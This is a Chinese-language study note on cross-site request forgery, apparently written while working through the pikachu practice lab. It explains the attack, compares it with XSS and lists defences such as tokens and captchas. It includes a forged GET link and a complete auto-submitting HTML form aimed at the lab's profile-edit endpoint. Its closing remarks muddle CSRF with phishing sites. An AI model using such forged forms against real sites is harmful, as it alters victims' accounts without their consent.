CSRF:跨站请求伪造（Cross-site request forgery）CSRF是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。当用户访问含有恶意代码的网页时,会向指定正常网站发送非本人意愿的数据请求包（如转账给hack,向hack发送API等）如果此时用户恰好登录了该正常网站（也就是身份验证是正常的）就会执行该恶意代码的请求，从而造成CSRF。

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任

pikachu靶场试验CSRF模块里登录进去抓个包看看"修改个人信息"的请求包 理论上来说 如果攻击者在自己的页面伪造了含有这个请求包的代码，一旦用户上钩点进恶意网站且pikachu属于登录状态就会触发CSRF漏洞

场景需求：
小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。
先看下大白是如何修改自己的密码的：
登录---修改会员信息，提交请求---修改成功。
所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。
但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？
于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：
【http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change】
于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。


为啥小黑的操作能够实现呢。有如下几个关键点：
1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;
---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。
2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;
---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。
---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。
当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。
---所以跟上面比一下，就可以看出CSRF与XSS的区别：
CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。
因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：
--对敏感信息的操作增加安全的token；
--对敏感信息的操作增加安全的验证码；
--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

比如pikachu修改信息的地址就是
GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=ff&phonenum=234&add=233&email=233&submit=submit 
我把这个链接发送给别人就可以修改别人的信息了

GET攻击可以发送恶意链接和XSS一样
但是如果目标使用的是POST请求你怎么弄？

答案是搭建恶意网站
构造自己的恶意表单
搭建一个恶意网站将受害者信息进行修改
并将恶意网站URL发送给受害者

<html>
<head>
<script>
window.onload = function() {
  document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<form method="post" action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php">
    <input id="sex" type="text" name="sex" value="girl" />
    <input id="phonenum" type="text" name="phonenum" value="123456789" />
    <input id="add" type="text" name="add" value="hubei" />
    <input id="email" type="text" name="email" value="lucy@163.com" />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>

action仍然是目标系统的action
仍然是使用用户的权限做了这件事情
我想这种攻击的实际情况是这样的
攻击者搞了一个伪造的网站，比如伪造一个银行系统网站
用户没搞清楚情况，以为这个伪造的银行网站是正规的网站
就进入了系统
这个山寨系统里面就存在了各种各样的表单，表单的提交请求都会提交到真正的那个银行系统里面
用户在这个山寨系统的各种操作都会被记录下来
黑客就知道用户修改了什么东西，如果修改了密码。那么就盗取了密码


